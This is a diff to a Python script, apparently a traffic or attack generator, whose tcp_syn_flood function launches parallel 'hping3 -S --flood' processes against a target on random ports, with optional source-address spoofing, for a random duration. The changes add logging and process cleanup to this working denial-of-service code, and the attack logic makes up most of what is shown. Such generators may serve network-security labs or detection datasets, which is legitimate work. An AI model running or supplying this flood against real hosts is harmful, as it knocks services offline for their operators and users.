@@ -171,7 +171,7 @@ def hping3_traffic(target, log_file=None):
     return run_command(cmd, timeout=30, log_file=log_file)
 
 
-def tcp_syn_flood(target, duration=None):
+def tcp_syn_flood(target, duration=None, log_file=None):
     """Randomized TCP SYN flood across multiple ports and parallel processes.
 
     All parameters are randomized if not provided:
@@ -193,11 +193,11 @@ def tcp_syn_flood(target, duration=None):
     rand_src_flag = "--rand-source" if rand_src else ""
 
     log_message("!!! ATTACK (randomized): duration={0}s ports={1} concurrency={2} rand_src={3}"
-                .format(duration, ports, concurrency, rand_src))
+                .format(duration, ports, concurrency, rand_src), log_file)
 
     procs = []
+    start_time = time.time()
     try:
-        start_time = time.time()
         # Launch `concurrency` flood processes in parallel. Each process picks a random port
         for i in range(concurrency):
             # choose a port for this process at random from chosen set
@@ -207,35 +207,59 @@ def tcp_syn_flood(target, duration=None):
             cmd = "timeout {dur} hping3 -S --flood -p {port} {rand} {target}".format(
                 dur=duration, port=port, rand=rand_src_flag, target=target)
 
-            log_message("Launching flood process: {0}".format(cmd))
+            log_message("Launching flood process [{}/{}]: {}".format(i+1, concurrency, cmd), log_file)
             p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            procs.append(p)
+            procs.append((p, cmd, port))
 
         # Wait for duration (or until processes exit). Poll so we can be responsive.
         while time.time() - start_time < duration:
-            if all(p.poll() is not None for p in procs):
+            if all(p[0].poll() is not None for p in procs):
                 # all processes finished early
+                log_message("All flood processes finished early", log_file)
                 break
             time.sleep(0.2)
 
+        # Log completion status of each process
+        for p, cmd, port in procs:
+            rc = p.poll()
+            if rc is not None:
+                log_message("Flood process on port {} completed with rc={}".format(port, rc), log_file)
+
     except Exception as e:
-        log_message("Error during randomized SYN flood: {0}".format(e))
+        log_message("Error during randomized SYN flood: {0}".format(e), log_file)
 
     finally:
         # Ensure all processes are terminated/cleaned up
-        for p in procs:
+        for p, cmd, port in procs:
             try:
                 if p.poll() is None:
+                    log_message("Terminating flood process on port {}".format(port), log_file)
                     p.terminate()
                     try:
                         p.wait(timeout=1)
                     except Exception:
+                        log_message("Force killing flood process on port {}".format(port), log_file)
                         p.kill()
-            except Exception:
-                pass
+                # Capture any output
+                try:
+                    out, err = p.communicate(timeout=0.5)
+                    if out:
+                        out_s = out.decode('utf-8', errors='replace').strip()
+                        if out_s:
+                            log_message("Flood STDOUT (port {}): {}".format(port, out_s), log_file)
+                    if err:
+                        err_s = err.decode('utf-8', errors='replace').strip()
+                        if err_s:
+                            log_message("Flood STDERR (port {}): {}".format(port, err_s), log_file)
+                except Exception:
+                    pass
+            except Exception as ex:
+                log_message("Error cleaning up flood process on port {}: {}".format(port, ex), log_file)
 
-    log_message("!!! ATTACK COMPLETE (randomized): duration={0}s ports={1} concurrency={2} rand_src={3}"
-                .format(duration, ports, concurrency, rand_src))
+    elapsed = time.time() - start_time
+    log_message("!!! ATTACK COMPLETE (randomized): duration={0}s (actual={1:.2f}s) ports={2} concurrency={3} "
+                "rand_src={4}"
+                .format(duration, elapsed, ports, concurrency, rand_src), log_file)
     return True
 
 
@@ -280,7 +304,7 @@ def attack_window(target, log_file=None):
     duration = random.randint(20, 60)
 
     try:
-        tcp_syn_flood(target, duration)
+        tcp_syn_flood(target, duration=duration, log_file=log_file)
     except Exception as e:
         log_message("Error in attack generation: {0}".format(e), log_file)
 
